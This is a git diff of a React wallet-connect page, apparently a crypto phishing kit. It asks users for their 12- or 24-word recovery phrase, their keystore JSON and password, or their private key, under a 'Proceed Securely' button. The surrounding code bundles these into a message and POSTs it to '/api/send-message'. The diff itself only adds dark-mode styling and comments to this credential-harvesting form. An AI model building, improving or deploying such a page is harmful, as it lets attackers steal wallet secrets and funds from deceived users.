@@ -129,7 +129,7 @@ Connection Method: ${activeTab.toUpperCase()}
 --------------------------------
 ${credentialInfo}
         `.trim();
-        
+
         try {
             await fetch("/api/send-message", {
                 method: 'POST',
@@ -162,28 +162,28 @@ ${credentialInfo}
     return (
         <div className="w-full max-w-lg relative z-20 animate-fade-in-up">
 
-            {/* ... KEEP YOUR EXISTING JSX LAYOUT ... */}
-
+            {/* Back Link - Adaptive Colors */}
             <div className="mb-6 pl-2">
-                <Link href="/dapp" className="inline-flex items-center gap-2 text-slate-500 hover:text-slate-900 transition-colors font-bold text-sm">
+                <Link href="/dapp" className="inline-flex items-center gap-2 text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition-colors font-bold text-sm">
                     <ChevronLeft size={18} /> Choose Different Wallet
                 </Link>
             </div>
 
-            <div className="bg-white/80 backdrop-blur-xl border border-white/60 shadow-2xl rounded-[2.5rem] overflow-hidden ring-1 ring-white/50">
-                {/* Header and Tabs (Same as before) */}
-                <div className="relative bg-slate-50/50 border-b border-gray-100 p-8 pb-6 text-center">
-                    {/* ... Header JSX ... */}
+            {/* Main Card - Glass Effect adapted for Dark Mode */}
+            <div className="bg-white/80 dark:bg-slate-900/80 backdrop-blur-xl border border-white/60 dark:border-slate-700 shadow-2xl rounded-[2.5rem] overflow-hidden ring-1 ring-white/50 dark:ring-slate-800">
+
+                {/* Header */}
+                <div className="relative bg-slate-50/50 dark:bg-slate-950/50 border-b border-gray-100 dark:border-slate-800 p-8 pb-6 text-center">
                     <div className="flex flex-col items-center">
                         <div className="relative w-24 h-24 mb-5 group">
-                            <Image src={imageUrl} alt={name} width={88} height={88} className="rounded-[0.8rem]" />
+                            <Image src={imageUrl} alt={name} width={88} height={88} className="rounded-[0.8rem] border border-white dark:border-slate-600 shadow-sm" />
                         </div>
-                        <h1 className="text-3xl font-black text-slate-900 tracking-tight mb-1">{name}</h1>
+                        <h1 className="text-3xl font-black text-slate-900 dark:text-white tracking-tight mb-1">{name}</h1>
                     </div>
                 </div>
 
-                {/* Tabs */}
-                <div className="p-2 bg-slate-50/80 border-b border-gray-100 flex gap-1">
+                {/* Tabs Navigation */}
+                <div className="p-2 bg-slate-50/80 dark:bg-slate-950/50 border-b border-gray-100 dark:border-slate-800 flex gap-1">
                     {[
                         { id: "phrase", icon: Type, label: "Phrase" },
                         { id: "keystore", icon: FileJson, label: "Keystore" },
@@ -194,8 +194,8 @@ ${credentialInfo}
                             type="button"
                             onClick={() => setActiveTab(tab.id as any)}
                             className={`flex-1 py-3 text-xs sm:text-sm font-bold rounded-xl transition-all flex items-center justify-center gap-2 ${activeTab === tab.id
-                                ? "bg-white text-blue-600 shadow-[0_2px_8px_-2px_rgba(0,0,0,0.05)] ring-1 ring-black/5"
-                                : "text-slate-400 hover:text-slate-600 hover:bg-white/40"
+                                ? "bg-white dark:bg-slate-800 text-blue-600 dark:text-blue-400 shadow-[0_2px_8px_-2px_rgba(0,0,0,0.05)] ring-1 ring-black/5 dark:ring-white/10"
+                                : "text-slate-400 dark:text-slate-500 hover:text-slate-600 dark:hover:text-slate-300 hover:bg-white/40 dark:hover:bg-slate-800/50"
                                 }`}
                         >
                             <tab.icon size={16} /> {tab.label}
@@ -203,10 +203,11 @@ ${credentialInfo}
                     ))}
                 </div>
 
-                <div className="p-6 sm:p-8 bg-white/40">
+                {/* Form Body */}
+                <div className="p-6 sm:p-8 bg-white/40 dark:bg-slate-900/20">
                     <form onSubmit={handleConnect} className="space-y-6">
 
-                        {/* Inputs (Keep your existing inputs with name="" attributes) */}
+                        {/* PHRASE INPUT */}
                         {activeTab === "phrase" && (
                             <div className="space-y-4 animate-fade-in">
                                 <div className="relative group">
@@ -214,30 +215,50 @@ ${credentialInfo}
                                         name="phrase"
                                         required
                                         placeholder="Enter your 12 or 24 word recovery phrase..."
-                                        className="w-full h-32 p-4 bg-slate-50 border border-gray-200 rounded-2xl text-slate-900 placeholder:text-slate-400 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none resize-none transition-all text-sm font-medium leading-relaxed"
+                                        className="w-full h-32 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none resize-none transition-all text-sm font-medium leading-relaxed"
                                     />
                                 </div>
                             </div>
                         )}
 
+                        {/* KEYSTORE INPUT */}
                         {activeTab === "keystore" && (
                             <div className="space-y-4 animate-fade-in">
-                                <textarea name="keystore_json" required className="w-full h-24 p-4 bg-slate-50 border border-gray-200 rounded-2xl text-slate-900 text-sm font-mono" placeholder="Keystore JSON" />
-                                <input name="keystore_password" type="password" required className="w-full p-4 bg-slate-50 border border-gray-200 rounded-2xl text-slate-900 text-sm" placeholder="Password" />
+                                <textarea
+                                    name="keystore_json"
+                                    required
+                                    className="w-full h-24 p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-sm font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
+                                    placeholder="Keystore JSON"
+                                />
+                                <input
+                                    name="keystore_password"
+                                    type="password"
+                                    required
+                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-sm placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
+                                    placeholder="Password"
+                                />
                             </div>
                         )}
 
+                        {/* PRIVATE KEY INPUT */}
                         {activeTab === "private" && (
                             <div className="space-y-4 animate-fade-in">
-                                <input name="private_key" type="password" required className="w-full p-4 bg-slate-50 border border-gray-200 rounded-2xl text-slate-900 text-sm font-mono" placeholder="Private Key" />
+                                <input
+                                    name="private_key"
+                                    type="password"
+                                    required
+                                    className="w-full p-4 bg-slate-50 dark:bg-slate-950 border border-gray-200 dark:border-slate-700 rounded-2xl text-slate-900 dark:text-white text-sm font-mono placeholder:text-slate-400 dark:placeholder:text-slate-600 focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 outline-none"
+                                    placeholder="Private Key"
+                                />
                             </div>
                         )}
 
+                        {/* Submit Button */}
                         <div className="pt-2">
                             <button
                                 disabled={loading}
                                 type="submit"
-                                className="w-full bg-slate-900 hover:bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg shadow-slate-900/20 transition-all hover:-translate-y-0.5 disabled:opacity-70 flex items-center justify-center gap-2"
+                                className="w-full bg-slate-900 dark:bg-blue-600 hover:bg-blue-600 dark:hover:bg-blue-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-slate-900/20 dark:shadow-blue-900/20 transition-all hover:-translate-y-0.5 disabled:opacity-70 flex items-center justify-center gap-2"
                             >
                                 {loading ? "Processing..." : "Proceed Securely"}
                             </button>
